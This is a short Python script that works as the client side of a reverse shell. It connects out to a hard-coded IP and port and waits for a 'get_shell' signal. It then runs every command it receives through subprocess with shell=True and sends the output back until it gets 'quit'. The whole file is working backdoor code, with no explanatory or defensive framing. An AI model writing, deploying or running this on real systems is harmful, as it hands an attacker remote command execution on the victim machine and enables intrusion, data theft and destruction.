import socket
import subprocess

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = result.stdout + result.stderr
        return output
    except Exception as e:
        return str(e)

def main():
    target_host = "192.168.10.196"  # Replace with the server IP address
    target_port = 9018              # Replace with the server port number

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((target_host, target_port))

    # Wait for the server's shell request
    data = client.recv(1024).decode("utf-8")
    if data == "get_shell":
        print("Shell request received from the server.")
        while True:
            command = client.recv(1024).decode("utf-8")
            if command.strip().lower() == 'quit':
                client.close()
                break
            response = execute_command(command)
            client.send(response.encode("utf-8"))

if __name__ == "__main__":
    main()
